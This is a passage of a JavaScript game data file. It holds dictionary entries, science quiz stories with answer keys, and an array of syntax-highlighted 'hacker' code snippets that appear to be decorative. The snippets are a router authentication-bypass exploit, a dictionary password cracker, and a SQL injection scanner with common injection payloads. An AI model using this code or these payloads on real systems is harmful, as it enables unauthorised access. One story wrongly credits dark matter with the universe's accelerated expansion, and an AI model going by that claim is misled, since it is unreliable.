        "definition": "a system for transmitting visual images and sound that are reproduced on screens, chiefly used to broadcast programs for entertainment, information, and education",
        "example": "She watches her favorite shows on television."
    },
    "tell": {
        "definition": "communicate information, facts, or news to someone in spoken or written words",
        "example": "He decided to tell her the truth."
    },
    "ten": {
        "definition": "equivalent to the product of five and two; one more than nine, or four less than fourteen; 10",
        "example": "They baked ten cookies."
    },
    "tend": {
        "definition": "regularly or frequently behave in a particular way or have a certain characteristic",
        "example": "She tends to be very organized."
    },
    "term": {
        "definition": "a word or phrase used to describe a thing or to express a concept, especially in a particular kind of language or branch of study",
        "example": "The term 'biodiversity' encompasses the variety of life on Earth."
    },
    "test": {
        "definition": "a procedure intended to establish the quality, performance, or reliability of something, especially before it is taken into widespread use",
        "example": "She studied hard for the math test."
    },
    "than": {
        "definition": "used to introduce the second element in a comparison",
        "example": "She is taller than her brother."
    },
    "thank": {
        "definition": "express gratitude to (someone), especially by saying 'Thank you'",
        "example": "She wanted to thank him for his help."
    },
    "that": {
        "definition": "used to identify a specific person or thing observed or heard by the speaker",
        "example": "She pointed to the book and said, 'I want that one.'"
    },
    "the": {
        "definition": "denoting one or more people or things already mentioned or assumed to be common knowledge",
        "example": "She walked to the store."
    },
    "their": {
        "definition": "belonging to or associated with the people or things previously mentioned or easily identified",
        "example": "They love their new home."
    },
    "them": {
        "definition": "used as the object of a verb or preposition to refer to two or more people or things previously mentioned or easily identified",
        "example": "She gave them the keys."
    },
    "themselves": {
        "definition": "used as the object of a verb or preposition to refer to two or more people or things previously mentioned as the subject of the clause",
        "example": "They prepared the meal themselves."
    },
    "then": {
        "definition": "at that time; at the time in question",
        "example": "She finished her homework and then went for a walk."
    },
    "theory": {
        "definition": "a supposition or a system of ideas intended to explain something, especially one based on general principles independent of the thing to be explained",
        "example": "She has a theory about why the experiment failed."
    },
    "there": {
        "definition": "in, at, or to that place or position",
        "example": "She left her bag over there."
    },
    "these": {
        "definition": "used to identify a specific person or thing close at hand or being indicated or experienced",
        "example": "These are my favorite shoes."
    },
    "they": {
        "definition": "used to refer to two or more people or things previously mentioned or easily identified",
        "example": "They are going to the concert tonight."
    },
    "thing": {
        "definition": "an object that one need not, cannot, or does not wish to give a specific name to",
        "example": "She couldn't remember the name of the thing she bought."
    },
    "think": {
        "definition": "have a particular opinion, belief, or idea about someone or something",
        "example": "She thinks it will rain tomorrow."
    },
    "third": {
        "definition": "constituting number three in a sequence; 3rd",
        "example": "She finished in third place in the competition."
    },
    "this": {
        "definition": "used to identify a specific person or thing close at hand or being indicated or experienced",
        "example": "This is my favorite book."
    },
    "those": {
        "definition": "used to identify a specific person or thing observed or heard by the speaker",
        "example": "Those are the books I was talking about."
    },
    "though": {
        "definition": "despite the fact that; although",
        "example": "Though it was raining, they went for a walk."
    },
    "thought": {
        "definition": "an idea or opinion produced by thinking or occurring suddenly in the mind",
        "example": "She had a sudden thought about the solution."
    },
    "thousand": {
        "definition": "the number equivalent to the product of a hundred and ten; 1,000",
        "example": "The city has a population of over a thousand people."
    },
    "threat": {
        "definition": "a person or thing likely to cause damage or danger",
        "example": "The storm posed a serious threat to the coastal town."
    },
    "three": {
        "definition": "equivalent to the sum of one and two; one more than two, or seven less than ten; 3",
        "example": "She has three cats."
    },
    "through": {
        "definition": "moving in one side and out of the other side of (an opening, channel, or location)",
        "example": "They walked through the park."
    },
    "throughout": {
        "definition": "in every part of (a place or object)",
        "example": "The news spread throughout the town."
    },
    "throw": {
        "definition": "propel (something) with force through the air by a movement of the arm and hand",
        "example": "She decided to throw the ball to her dog."
    },
    "thus": {
        "definition": "as a result or consequence of this; therefore",
        "example": "The project was successful, thus proving their hypothesis."
    },
    "time": {
        "definition": "the indefinite continued progress of existence and events in the past, present, and future regarded as a whole",
        "example": "They spent a lot of time together."
    },
    "to": {
        "definition": "expressing motion in the direction of (a particular location)",
        "example": "She decided to go to the store."
    },
    "today": {
        "definition": "on or in the course of this present day",
        "example": "She has a lot of work to do today."
    },
    "together": {
        "definition": "with or in proximity to another person or people",
        "example": "They worked together on the project."
    },
    "tonight": {
        "definition": "on the present or approaching evening or night",
        "example": "They have plans for dinner tonight."
    },
    "too": {
        "definition": "to a higher degree than is desirable, permissible, or possible; excessively",
        "example": "The coffee is too hot to drink."
    },
    "top": {
        "definition": "the highest or uppermost point, part, or surface of something",
        "example": "She climbed to the top of the hill."
    },
    "total": {
        "definition": "comprising the whole number or amount",
        "example": "The total cost of the trip was quite high."
    },
    "tough": {
        "definition": "strong enough to withstand adverse conditions or rough handling",
        "example": "She is a tough competitor."
    },
    "toward": {
        "definition": "in the direction of",
        "example": "They walked toward the park."
    },
    "town": {
        "definition": "an urban area that has a name, defined boundaries, and local government, and that is generally larger than a village and smaller than a city",
        "example": "They decided to explore the town."
    },
    "trade": {
        "definition": "the action of buying and selling goods and services",
        "example": "They engage in international trade."
    },
    "traditional": {
        "definition": "existing in or as part of a tradition; long-established",
        "example": "They celebrated with traditional dances."
    },
    "training": {
        "definition": "the action of teaching a person or animal a particular skill or type of behavior",
        "example": "She is undergoing training for her new job."
    },
    "travel": {
        "definition": "make a journey, typically of some length or abroad",
        "example": "They love to travel to new places."
    },
    "treat": {
        "definition": "behave toward or deal with in a certain way",
        "example": "She decided to treat herself to a nice dinner."
    },
    "treatment": {
        "definition": "medical care given to a patient for an illness or injury",
        "example": "He received treatment for his injury."
    },
    "tree": {
        "definition": "a woody perennial plant, typically having a single stem or trunk growing to a considerable height and bearing lateral branches at some distance from the ground",
        "example": "They planted a tree in the garden."
    },
    "trial": {
        "definition": "a formal examination of evidence before a judge, and typically before a jury, in order to decide guilt in a case of criminal or civil proceedings",
        "example": "The trial was widely covered by the media."
    },
    "trip": {
        "definition": "a journey or excursion, especially for pleasure",
        "example": "They went on a weekend trip to the beach."
    },
    "trouble": {
        "definition": "difficulty or problems that cause distress or worry",
        "example": "She had trouble understanding the instructions."
    },
    "true": {
        "definition": "in accordance with fact or reality",
        "example": "Her story was true."
    },
    "truth": {
        "definition": "the quality or state of being true",
        "example": "She always speaks the truth."
    },
    "try": {
        "definition": "make an attempt or effort to do something",
        "example": "She decided to try a new recipe."
    },
    "turn": {
        "definition": "move in a circular direction wholly or partly around an axis or point",
        "example": "She decided to turn the knob to open the door."
    },
    "TV": {
        "definition": "a system for transmitting visual images and sound that are reproduced on screens, chiefly used to broadcast programs for entertainment, information, and education",
        "example": "They watched their favorite show on TV."
    },
    "two": {
        "definition": "equivalent to the sum of one and one; one less than three; 2",
        "example": "She has two cats."
    },
    "type": {
        "definition": "a category of people or things having common characteristics",
        "example": "She prefers this type of music."
    },
    "under": {
        "definition": "extending or directly below",
        "example": "She found her keys under the couch."
    },
    "understand": {
        "definition": "perceive the intended meaning of (words, a language, or a speaker)",
        "example": "She took the time to understand the instructions."
    },
    "unit": {
        "definition": "an individual thing or person regarded as single and complete, especially for purposes of calculation",
        "example": "They formed a tight-knit unit."
    },
    "until": {
        "definition": "up to (the point in time or the event mentioned)",
        "example": "They waited until she arrived."
    },
    "up": {
        "definition": "toward a higher place or position",
        "example": "She looked up at the sky."
    },
    "upon": {
        "definition": "more formal term for on, especially in abstract senses",
        "example": "She placed the vase upon the table."
    },
    "us": {
        "definition": "used by a speaker to refer to himself or herself and one or more other people as the object of a verb or preposition",
        "example": "She gave us a tour of the museum."
    },
    "use": {
        "definition": "take, hold, or deploy (something) as a means of accomplishing a purpose or achieving a result; employ",
        "example": "She decided to use a pen to write the letter."
    },
    "usually": {
        "definition": "under normal conditions; generally",
        "example": "She usually goes for a run in the morning."
    },
    "value": {
        "definition": "the regard that something is held to deserve; the importance, worth, or usefulness of something",
        "example": "They place a high value on education."
    },
    "various": {
        "definition": "different from one another; of different kinds or sorts",
        "example": "She enjoys reading books on various topics."
    },
    "very": {
        "definition": "in a high degree",
        "example": "She is very talented."
    },
    "victim": {
        "definition": "a person harmed, injured, or killed as a result of a crime, accident, or other event or action",
        "example": "The victim of the accident was taken to the hospital."
    },
    "view": {
        "definition": "the ability to see something or to be seen from a particular place",
        "example": "She had a beautiful view of the ocean from her window."
    },
    "violence": {
        "definition": "behavior involving physical force intended to hurt, damage, or kill someone or something",
        "example": "They condemned all forms of violence."
    },
    "visit": {
        "definition": "go to see and spend time with (someone) socially",
        "example": "They decided to visit their grandparents."
    },
    "voice": {
        "definition": "the sound produced in a person's larynx and uttered through the mouth, as speech or song",
        "example": "She has a beautiful singing voice."
    },
    "vote": {
        "definition": "a formal indication of a choice between two or more candidates or courses of action, expressed typically through a ballot or a show of hands",
        "example": "They went to vote in the election."
    },
    "wait": {
        "definition": "stay where one is or delay action until a particular time or until something else happens",
        "example": "She decided to wait for the bus."
    },
    "walk": {
        "definition": "move at a regular pace by lifting and setting down each foot in turn, never having both feet off the ground at once",
        "example": "They decided to walk to the park."
    },
    "wall": {
        "definition": "a continuous vertical brick or stone structure that encloses or divides an area of land",
        "example": "She hung a picture on the wall."
    },
    "want": {
        "definition": "have a desire to possess or do (something); wish for",
        "example": "She wants to travel the world."
    },
    "war": {
        "definition": "a state of armed conflict between different countries or different groups within a country",
        "example": "The war lasted for several years."
    },
    "watch": {
        "definition": "look at or observe attentively over a period of time",
        "example": "They decided to watch a movie together."
    },
    "water": {
        "definition": "a colorless, transparent, odorless liquid that forms the seas, lakes, rivers, and rain and is the basis of the fluids of living organisms",
        "example": "She drank a glass of water."
    },
    "way": {
        "definition": "a method, style, or manner of doing something; an optional or alternative form of action",
        "example": "She found a new way to solve the problem."
    },
    "we": {
        "definition": "used by a speaker to refer to himself or herself and one or more other people considered together",
        "example": "We decided to go on a road trip."
    },
    "weapon": {
        "definition": "a thing designed or used for inflicting bodily harm or physical damage",
        "example": "The soldier carried a weapon for protection."
    },
    "wear": {
        "definition": "have (something) on one's body as clothing, decoration, or protection",
        "example": "She decided to wear a red dress to the party."
    },
    "week": {
        "definition": "a period of seven days",
        "example": "They plan to go on vacation next week."
    },
    "weight": {
        "definition": "the force exerted on the mass of a body by a gravitational field",
        "example": "She decided to lift weights to build muscle."
    },
    "well": {
        "definition": "in a good or satisfactory way",
        "example": "She did well on her exam."
    },
    "west": {
        "definition": "the direction toward the point of the horizon where the sun sets at the equinoxes, on the left-hand side of a person facing north, or the part of the horizon lying in this direction",
        "example": "They decided to drive west to reach the coast."
    },
    "western": {
        "definition": "situated in the west, or directed toward or facing the west",
        "example": "They visited the western part of the country."
    },
    "what": {
        "definition": "asking for information specifying something",
        "example": "What is your favorite book?"
    },
    "whatever": {
        "definition": "used to emphasize a lack of restriction in referring to anything or amount",
        "example": "You can choose whatever you like."
    },
    "when": {
        "definition": "at what time",
        "example": "When will you arrive?"
    },
    "where": {
        "definition": "in or to what place or position",
        "example": "Where do you live?"
    },
    "whether": {
        "definition": "expressing a doubt or choice between alternatives",
        "example": "She couldn't decide whether to stay or leave."
    },
    "which": {
        "definition": "asking for information specifying one or more people or things from a definite set",
        "example": "Which color do you prefer?"
    },
    "while": {
        "definition": "a period of time",
        "example": "They talked for a while."
    },
    "white": {
        "definition": "of the color of milk or fresh snow, due to the reflection of most wavelengths of visible light; the opposite of black",
        "example": "She wore a white dress to the wedding."
    },
    "who": {
        "definition": "what or which person or people",
        "example": "Who is your favorite author?"
    },
    "whole": {
        "definition": "all of; entire",
        "example": "She read the whole book in one day."
    },
    "whom": {
        "definition": "used instead of 'who' as the object of a verb or preposition",
        "example": "To whom did you give the book?"
    },
    "whose": {
        "definition": "belonging to or associated with which person",
        "example": "Whose bag is this?"
    }
};

/**
 * This file contains the stories and questions for the quiz game.
 * Each story is an object with the following properties:
 * - title: The title of the story
 * - fiction: A boolean indicating whether the story is fictional or non-fictional
 * - content: The text of the story
 * - questions: An array of 3 question objects
 * Each question object has the following properties:
 * - question: The text of the question
 * - options: An array of 4 possible answers
 * - answer: The correct answer
 */
const stories = [
    {
        title: 'The Accidental Breakthrough of Penicillin',
        fiction: false,
        content: `In 1928, Scottish bacteriologist Alexander Fleming made a serendipitous discovery when he noticed a mold growing on his staphylococcus culture plates. This mold, later identified as Penicillium notatum, inhibited bacterial growth. Although Fleming published his findings, the clinical potential of penicillin remained largely unrecognized until Howard Florey and Ernst Chain refined its extraction and tested it on human subjects. This antibiotic marked a turning point in medical history, saving countless lives across the globe.`,
        questions: [
            {
                question: 'Which genus of fungus was responsible for the earliest form of penicillin discovered by Fleming?',
                options: ['Aspergillus', 'Penicillium', 'Rhizopus', 'Candida'],
                answer: 'Penicillium'
            },
            {
                question: 'Who refined and successfully tested penicillin on human subjects after Fleming\'s initial discovery?',
                options: ['Chain and Florey', 'Marie and Pierre Curie', 'Edward Jenner', 'Robert Koch'],
                answer: 'Chain and Florey'
            },
            {
                question: 'In which year did Fleming observe the antibacterial effects of the mold that led to penicillin?',
                options: ['1928', '1918', '1942', '1935'],
                answer: '1928'
            }
        ]
    },
    {
        title: 'Unraveling the Double Helix',
        fiction: false,
        content: `In 1953, James Watson and Francis Crick proposed the double-helix model of DNA. Their groundbreaking work, featured in a now-famous one-page paper published in Nature, drew heavily on Rosalind Franklin\'s X-ray crystallography data obtained at King\'s College London, which provided crucial insights into DNA\'s helical structure. Despite Franklin\'s pivotal contributions, only Watson, Crick, and Maurice Wilkins received the Nobel Prize in Physiology or Medicine in 1962 for their discoveries regarding the molecular structure of nucleic acids.`,
        questions: [
            {
                question: 'Which technique was pivotal in revealing the helical structure of DNA in Rosalind Franklin\'s research?',
                options: ['Electron microscopy', 'Radioisotope tracing', 'X-ray crystallography', 'NMR spectroscopy'],
                answer: 'X-ray crystallography'
            },
            {
                question: 'In which scientific journal was the groundbreaking DNA structure paper by Watson and Crick published in April 1953?',
                options: ['Science', 'Nature', 'Cell', 'Proceedings of the National Academy of Sciences'],
                answer: 'Nature'
            },
            {
                question: 'Who shared the 1962 Nobel Prize in Physiology or Medicine with Francis Crick and James Watson?',
                options: ['Rosalind Franklin', 'Max Perutz', 'Maurice Wilkins', 'Erwin Chargaff'],
                answer: 'Maurice Wilkins'
            }
        ]
    },
    {
        title: 'The Manhattan Project: Dawn of the Atomic Age',
        fiction: false,
        content: `Launched during World War II, the Manhattan Project was a top-secret program aimed at harnessing nuclear fission to create an atomic bomb. Under the leadership of General Leslie Groves and physicist J. Robert Oppenheimer, scientists at Los Alamos Laboratory raced to develop the first nuclear device. Nicknamed “Gadget,” this device was successfully tested during the Trinity test on July 16, 1945. Earlier, in 1942, Enrico Fermi oversaw the first self-sustaining nuclear chain reaction at the University of Chicago, paving the way for the unprecedented power of atomic weapons and ushering in the atomic age.`,
        questions: [
            {
                question: 'What was the code name of the world\'s first nuclear device tested on July 16, 1945?',
                options: ['Gadget', 'Little Boy', 'Fat Man', 'Thin Man'],
                answer: 'Gadget'
            },
            {
                question: 'Which theoretical physicist served as the scientific director of Los Alamos during the Manhattan Project?',
                options: ['Enrico Fermi', 'Richard Feynman', 'J. Robert Oppenheimer', 'Hans Bethe'],
                answer: 'J. Robert Oppenheimer'
            },
            {
                question: 'Where did the first self-sustaining nuclear chain reaction occur?',
                options: ['Oak Ridge, Tennessee', 'Hanford Site, Washington', 'Los Alamos, New Mexico', 'University of Chicago'],
                answer: 'University of Chicago'
            }
        ]
    },
    {
        title: 'The Curious Case of Schrödinger\'s Cat',
        fiction: false,
        content: `In 1935, physicist Erwin Schrödinger devised a thought experiment to illustrate the paradoxical nature of quantum mechanics. In this scenario, a cat is placed in a sealed box with a radioactive atom that has a 50% chance of decaying and triggering a mechanism that releases poison, potentially killing the cat. According to quantum superposition, the cat exists in a state of being both alive and dead until the box is opened and the cat\'s fate is observed. This experiment highlights the concept of superposition and the role of observation in quantum systems.`,
        questions: [
            {
                question: 'What is the name of the physicist who proposed the thought experiment involving a cat in a sealed box?',
                options: ['Werner Heisenberg', 'Niels Bohr', 'Erwin Schrödinger', 'Max Planck'],
                answer: 'Erwin Schrödinger'
            },
            {
                question: 'What is the term for the quantum principle that allows the cat to exist in a superposition of alive and dead states?',
                options: ['Quantum entanglement', 'Wave-particle duality', 'Quantum superposition', 'Heisenberg uncertainty principle'],
                answer: 'Quantum superposition'
            },
            {
                question: 'What is the probability of the radioactive atom decaying and triggering the poison mechanism in Schrödinger\'s thought experiment?',
                options: ['25%', '50%', '75%', '100%'],
                answer: '50%'
            }
        ]
    },
    {
        title: 'The Enigma of Dark Matter',
        fiction: false,
        content: `Dark matter, a mysterious and elusive substance that does not emit, absorb, or reflect light, comprises about 27% of the universe\'s total mass-energy content. Despite its pervasive influence on cosmic structures, dark matter remains undetectable through electromagnetic radiation. Proposed as a solution to the missing mass problem in galaxies and the accelerated expansion of the universe, dark matter\'s composition and properties remain a subject of ongoing research and speculation in the field of astrophysics.`,
        questions: [
            {
                question: 'What percentage of the universe\'s mass-energy content is estimated to be composed of dark matter?',
                options: ['5%', '27%', '50%', '75%'],
                answer: '27%'
            },
            {
                question: 'Which phenomenon in galaxies and the universe led to the proposal of dark matter as a solution?',
                options: ['Redshift', 'Dark energy', 'Missing mass', 'Cosmic microwave background radiation'],
                answer: 'Missing mass'
            },
            {
                question: 'Why is dark matter considered “dark”?',
                options: ['It absorbs all light', 'It emits light', 'It reflects light', 'It does not interact with light'],
                answer: 'It does not interact with light'
            }
        ]
    }
];
const hackerCode = [
    // Network Vulnerability Scanner
    `<span class="comment">#!/usr/bin/python3</span>
<span class="comment"># CVE-2023-7842 Exploit - Enterprise Router Backdoor</span>
<span class="keyword">import</span> <span class="variable">socket</span>
<span class="keyword">import</span> <span class="variable">struct</span>
<span class="keyword">import</span> <span class="variable">sys</span>
<span class="keyword">from</span> <span class="variable">ctypes</span> <span class="keyword">import</span> <span class="variable">c_uint32</span>

<span class="keyword">def</span> <span class="function">rotate_bits</span>(<span class="variable">val</span>, <span class="variable">r_bits</span>, <span class="variable">max_bits</span>=<span class="number">32</span>):
    <span class="keyword">return</span> ((<span class="variable">val</span> &lt;&lt; <span class="variable">r_bits</span>) % (<span class="number">1</span> &lt;&lt; <span class="variable">max_bits</span>)) | (<span class="variable">val</span> >> (<span class="variable">max_bits</span> - <span class="variable">r_bits</span>))

<span class="keyword">def</span> <span class="function">generate_auth_token</span>(<span class="variable">target_ip</span>, <span class="variable">secret_key</span>=<span class="number">0xF7A3B814</span>):
    <span class="variable">ip_parts</span> = [<span class="function">int</span>(<span class="variable">x</span>) <span class="keyword">for</span> <span class="variable">x</span> <span class="keyword">in</span> <span class="variable">target_ip</span>.<span class="function">split</span>(<span class="string">"."</span>)]
    <span class="variable">checksum</span> = <span class="function">c_uint32</span>(<span class="variable">ip_parts</span>[<span class="number">0</span>] ^ <span class="variable">ip_parts</span>[<span class="number">2</span>] ^ <span class="variable">secret_key</span>).<span class="variable">value</span>
    <span class="variable">checksum</span> = <span class="function">rotate_bits</span>(<span class="variable">checksum</span>, <span class="variable">ip_parts</span>[<span class="number">3</span>] % <span class="number">7</span> + <span class="number">3</span>)
    <span class="keyword">return</span> <span class="function">format</span>(<span class="variable">checksum</span> ^ <span class="variable">secret_key</span>, <span class="string">'08x'</span>)

<span class="keyword">def</span> <span class="function">send_exploit_packet</span>(<span class="variable">target</span>, <span class="variable">port</span>=<span class="number">4781</span>):
    <span class="variable">s</span> = <span class="function">socket</span>.<span class="function">socket</span>(<span class="variable">socket</span>.<span class="variable">AF_INET</span>, <span class="variable">socket</span>.<span class="variable">SOCK_STREAM</span>)
    <span class="variable">s</span>.<span class="function">settimeout</span>(<span class="number">5.0</span>)
    <span class="variable">auth_token</span> = <span class="function">generate_auth_token</span>(<span class="variable">target</span>)
    
    <span class="keyword">try</span>:
        <span class="variable">s</span>.<span class="function">connect</span>((<span class="variable">target</span>, <span class="variable">port</span>))
        <span class="function">print</span>(<span class="string">f"[+] Connected to {target}:{port}"</span>)
        
        <span class="comment"># Crafting exploit payload</span>
        <span class="variable">payload</span> = <span class="function">struct</span>.<span class="function">pack</span>(<span class="string">"!I"</span>, <span class="number">0xDEADBEEF</span>) + <span class="string">b"\\x00"</span> * <span class="number">8</span> + <span class="variable">auth_token</span>.<span class="function">encode</span>() + <span class="string">b"\\r\\n"</span>
        <span class="function">print</span>(<span class="string">f"[*] Sending auth token: {auth_token}"</span>)
        <span class="variable">s</span>.<span class="function">sendall</span>(<span class="variable">payload</span>)
        
        <span class="variable">response</span> = <span class="variable">s</span>.<span class="function">recv</span>(<span class="number">1024</span>)
        <span class="keyword">if</span> <span class="string">b"AUTH-OK"</span> <span class="keyword">in</span> <span class="variable">response</span>:
            <span class="function">print</span>(<span class="string">"[+] Authentication bypass successful!"</span>)
            <span class="keyword">return</span> <span class="variable">s</span>
        <span class="keyword">else</span>:
            <span class="function">print</span>(<span class="string">"[-] Authentication failed."</span>)
            <span class="keyword">return</span> <span class="variable">None</span>
            
    <span class="keyword">except</span> <span class="variable">Exception</span> <span class="keyword">as</span> <span class="variable">e</span>:
        <span class="function">print</span>(<span class="string">f"[-] Exploit failed: {str(e)}"</span>)
        <span class="keyword">return</span> <span class="variable">None</span>`,

    // Password Cracking Tool
    `<span class="comment">// Advanced Password Cracking Module</span>
<span class="keyword">const</span> <span class="variable">crypto</span> = <span class="function">require</span>(<span class="string">'crypto'</span>);
<span class="keyword">const</span> <span class="variable">fs</span> = <span class="function">require</span>(<span class="string">'fs'</span>);
<span class="keyword">const</span> <span class="variable">cluster</span> = <span class="function">require</span>(<span class="string">'cluster'</span>);
<span class="keyword">const</span> <span class="variable">numCPUs</span> = <span class="function">require</span>(<span class="string">'os'</span>).<span class="function">cpus</span>().<span class="variable">length</span>;

<span class="keyword">class</span> <span class="function">HashCracker</span> {
    <span class="function">constructor</span>(<span class="variable">hashType</span> = <span class="string">'sha256'</span>, <span class="variable">options</span> = {}) {
        <span class="variable">this</span>.<span class="variable">hashType</span> = <span class="variable">hashType</span>;
        <span class="variable">this</span>.<span class="variable">saltLength</span> = <span class="variable">options</span>.<span class="variable">saltLength</span> || <span class="number">8</span>;
        <span class="variable">this</span>.<span class="variable">iterations</span> = <span class="variable">options</span>.<span class="variable">iterations</span> || <span class="number">10000</span>;
        <span class="variable">this</span>.<span class="variable">charset</span> = <span class="string">' abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:",./<>?'</span>;
        <span class="variable">this</span>.<span class="variable">wordlist</span> = <span class="variable">options</span>.<span class="variable">wordlist</span> || <span class="string">'./wordlists/rockyou.txt'</span>;
    }

    <span class="function">async</span> <span class="function">crackHash</span>(<span class="variable">hash</span>, <span class="variable">salt</span> = <span class="string">''</span>) {
        <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[*] Starting \${this.hashType} cracker...\`</span>);
        <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[*] Target hash: \${hash}\`</span>);
        
        <span class="keyword">if</span> (<span class="variable">cluster</span>.<span class="function">isMaster</span>) {
            <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[+] Master process \${process.pid} is running\`</span>);
            <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[+] Spawning \${numCPUs} worker processes\`</span>);

            <span class="keyword">for</span> (<span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>; <span class="variable">i</span> < <span class="variable">numCPUs</span>; <span class="variable">i</span>++) {
                <span class="variable">cluster</span>.<span class="function">fork</span>();
            }

            <span class="variable">cluster</span>.<span class="variable">on</span>(<span class="string">'exit'</span>, (<span class="variable">worker</span>, <span class="variable">code</span>) => {
                <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[!] Worker\${worker.process.pid} died with code \${code}\`</span>);
            });
            
            <span class="keyword">return</span> <span class="keyword">new</span> <span class="function">Promise</span>(<span class="variable">resolve</span> => {
                <span class="variable">cluster</span>.<span class="variable">on</span>(<span class="string">'message'</span>, (<span class="variable">worker</span>, <span class="variable">message</span>) => {
                    <span class="keyword">if</span> (<span class="variable">message</span>.<span class="variable">found</span>) {
                        <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[+] Password found: \${message.password}\`</span>);
                        <span class="function">resolve</span>(<span class="variable">message</span>.<span class="variable">password</span>);
                        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="variable">id</span> <span class="keyword">in</span> <span class="variable">cluster</span>.<span class="variable">workers</span>) {
                            <span class="variable">cluster</span>.<span class="variable">workers</span>[<span class="variable">id</span>].<span class="function">kill</span>();
                        }
                    }
                });
            });
        } <span class="keyword">else</span> {
            <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[+] Worker \${process.pid} started\`</span>);
            <span class="keyword">await</span> <span class="variable">this</span>.<span class="function">_dictionaryAttack</span>(<span class="variable">hash</span>, <span class="variable">salt</span>);
        }
    }

    <span class="function">async</span> <span class="function">_dictionaryAttack</span>(<span class="variable">hash</span>, <span class="variable">salt</span>) {
        <span class="keyword">try</span> {
            <span class="keyword">const</span> <span class="variable">wordlist</span> = <span class="function">fs</span>.<span class="function">readFileSync</span>(<span class="variable">this</span>.<span class="variable">wordlist</span>, <span class="string">'utf8'</span>).<span class="function">split</span>(<span class="string">'\\n'</span>);
            <span class="keyword">let</span> <span class="variable">count</span> = <span class="number">0</span>;
            
            <span class="keyword">for</span> (<span class="keyword">const</span> <span class="variable">word</span> <span class="keyword">of</span> <span class="variable">wordlist</span>) {
                <span class="variable">count</span>++;
                <span class="keyword">if</span> (<span class="variable">count</span> % <span class="number">10000</span> === <span class="number">0</span>) {
                    <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[*] Worker \${process.pid} tried \${count} passwords...\`</span>);
                }

                <span class="keyword">const</span> <span class="variable">hashedWord</span> = <span class="variable">this</span>.<span class="function">_hashPassword</span>(<span class="variable">word</span>, <span class="variable">salt</span>);
                <span class="keyword">if</span> (<span class="variable">hashedWord</span> === <span class="variable">hash</span>) {
                    <span class="variable">process</span>.<span class="function">send</span>({ <span class="variable">found</span>: <span class="keyword">true</span>, <span class="variable">password</span>: <span class="variable">word</span> });
                    <span class="keyword">return</span> <span class="variable">word</span>;
                }
            }
            <span class="function">console</span>.<span class="function">log</span>(<span class="string">\`[-] Worker \${process.pid}: No match found in wordlist\`</span>);
        } <span class="keyword">catch</span> (<span class="variable">error</span>) {
            <span class="function">console</span>.<span class="function">error</span>(<span class="string">\`[-] Error during dictionary attack: \${error.message}\`</span>);
        }
    }

    <span class="function">_hashPassword</span>(<span class="variable">password</span>, <span class="variable">salt</span>) {
        <span class="keyword">return</span> <span class="variable">crypto</span>.<span class="function">pbkdf2Sync</span>(<span class="variable">password</span>, <span class="variable">salt</span>, <span class="variable">this</span>.<span class="variable">iterations</span>, <span class="number">64</span>, <span class="variable">this</span>.<span class="variable">hashType</span>).<span class="function">toString</span>(<span class="string">'hex'</span>);
    }
}`,

    // SQL Injection Attack
    `<span class="comment">#!/usr/bin/env python3</span>
<span class="comment"># SQLmap-style SQL injection scanner</span>

<span class="keyword">import</span> <span class="variable">requests</span>
<span class="keyword">import</span> <span class="variable">re</span>
<span class="keyword">import</span> <span class="variable">time</span>
<span class="keyword">import</span> <span class="variable">sys</span>
<span class="keyword">from</span> <span class="variable">urllib.parse</span> <span class="keyword">import</span> <span class="variable">urljoin</span>, <span class="variable">urlparse</span>, <span class="variable">parse_qsl</span>, <span class="variable">urlencode</span>
<span class="keyword">from</span> <span class="variable">concurrent.futures</span> <span class="keyword">import</span> <span class="variable">ThreadPoolExecutor</span>

<span class="keyword">class</span> <span class="function">SQLInjector</span>:
    <span class="keyword">def</span> <span class="function">__init__</span>(<span class="variable">self</span>, <span class="variable">target_url</span>, <span class="variable">cookies</span>=<span class="variable">None</span>, <span class="variable">headers</span>=<span class="variable">None</span>):
        <span class="variable">self</span>.<span class="variable">target_url</span> = <span class="variable">target_url</span>
        <span class="variable">self</span>.<span class="variable">cookies</span> = <span class="variable">cookies</span> <span class="keyword">or</span> {}
        <span class="variable">self</span>.<span class="variable">headers</span> = <span class="variable">headers</span> <span class="keyword">or</span> {
            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 SQLi Scanner'</span>
        }
        <span class="variable">self</span>.<span class="variable">vulnerable_params</span> = []
        <span class="variable">self</span>.<span class="variable">injection_payloads</span> = [
            <span class="string">"' OR '1'='1"</span>,
            <span class="string">" OR 1=1--"</span>,
            <span class="string">" UNION SELECT NULL,NULL,NULL--"</span>,
            <span class="string">"admin'--"</span>,
            <span class="string">"' OR '1'='1' --"</span>,
            <span class="string">"' OR '1'='1' #"</span>,
            <span class="string">"\\" OR 1=1--"</span>,
            <span class="string">"1'; WAITFOR DELAY '0:0:5'--"</span>,  <span class="comment"># Time-based SQL injection</span>
            <span class="string">"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"</span> <span class="comment"># MySQL time-based</span>
        ]
        <span class="variable">self</span>.<span class="variable">error_patterns</span> = [
            <span class="string">"SQL syntax error"</span>,
            <span class="string">"mysql_fetch_array()"</span>,
            <span class="string">"ORA-"</span>,
            <span class="string">"Microsoft SQL Server"</span>,
            <span class="string">"PostgreSQL"</span>,
            <span class="string">"syntax error"</span>,
            <span class="string">"unclosed quotation mark"</span>
        ]
        <span class="function">print</span>(<span class="string">f"[*] Initialized SQL injection scanner for {self.target_url}"</span>)
        
    <span class="keyword">def</span> <span class="function">extract_parameters</span>(<span class="variable">self</span>):
        <span class="variable">parsed_url</span> = <span class="function">urlparse</span>(<span class="variable">self</span>.<span class="variable">target_url</span>)
        <span class="variable">params</span> = <span class="function">dict</span>(<span class="function">parse_qsl</span>(<span class="variable">parsed_url</span>.<span class="variable">query</span>))
        <span class="keyword">return</span> <span class="variable">params</span>
    
    <span class="keyword">def</span> <span class="function">test_parameter</span>(<span class="variable">self</span>, <span class="variable">param_name</span>, <span class="variable">payload</span>):
